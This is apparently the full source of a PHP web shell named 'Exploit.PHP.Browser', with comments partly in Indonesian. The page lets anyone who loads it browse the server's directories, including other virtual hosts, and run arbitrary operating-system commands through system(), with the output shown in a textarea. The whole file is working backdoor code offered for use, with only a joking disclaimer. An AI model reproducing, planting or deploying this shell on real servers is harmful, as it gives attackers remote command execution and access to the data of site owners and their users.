<html>
<head><title>EXPLOIT.PHP.BROWSER</title></head>
<body><h1>EXPLOIT.PHP.BROWSER</h1>
<?
// Exploit.PHP.Browser By Psychologic
// Take ur own risk if you do stupid things
// with this.

if (isset($dir_kerja)) {
chdir($dir_kerja);				//change to working directory
$dir_kerja = exec("pwd");			//execute the pwd(daemon)
} else {
chdir($DOCUMENT_ROOT);				//Get the root directory
$dir_kerja = $DOCUMENT_ROOT;
}
if (trim($dir_baru) <> "") {
chdir($dir_baru);
$dir_kerja = exec("pwd");
}
?>
<form name="myform" action="<? echo $PHP_SELF ?>" method="post">
<p>Active directory : <b>
<?
$split_dir_kerja = explode("/", substr($dir_kerja, 1));
echo "<a href=\"$PHP_SELF?dir_kerja=" . urlencode($url) . "/&command=" . urlencode($command) . "\">Root</a>/";
if ($split_dir_kerja[0] == "") {
$dir_kerja = "/";
} else {
for ($i = 0; $i < count($split_dir_kerja); $i++) {
$url .= "/" . $split_dir_kerja[$i];
echo "<a href=\"$PHP_SELF?dir_kerja=" . urlencode($url) . "&command=" . urlencode($command) . "\">$split_dir_kerja[$i]</a>/";
}
}
// See you can look at many virtual host
?>
</b></p>
<p>Choose your new work directory</p>
<select name="dir_kerja" onChange="this.form.submit()">
<?
$dir_handle = opendir($dir_kerja);
while ($dir = readdir($dir_handle)) {
if (is_dir($dir)) {
if ($dir == ".") {
echo "<option value=\"$dir_kerja\" selected>Choose Directory</option>\n";
} elseif ($dir == "..") {
if (strlen($dir_kerja) == 1) {
} elseif (strrpos($dir_kerja, "/") == 0) {
echo "<option value=\"/\">Main Directory</option>\n";
} else {
echo "<option value=\"". strrev(substr(strstr(strrev($dir_kerja), "/"), 1)) ."\"> Main Directory </option>\n";
}
} else {
if ($dir_kerja == "/") {
echo "<option value=\"$dir_kerja$dir\">$dir</option>\n";
} else {
echo "<option value=\"$dir_kerja/$dir\">$dir</option>\n";
}
}
}
}
closedir($dir_handle);
?>
</select>
<input type="text" name="dir_baru" size="60" value="">
<p>Perintah :</p>
<input type="text" name="command" size="60" <? if ($command) { echo "value=\"$command\"";} ?> > 
<p><input name="submit_btn" type="submit" value="Execute command"></p>
<p>Perapian <code>stderr</code> diperlukan? 
<input type="checkbox" name="stderr"></p>
<p>Hasil Eksekusi :</p>
<textarea cols="80" rows="20" readonly>
<?
if ($command) {
if ($stderr) {
system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
} else {
system($command);
}
}
?>
</textarea>
</form>
</body>
</html>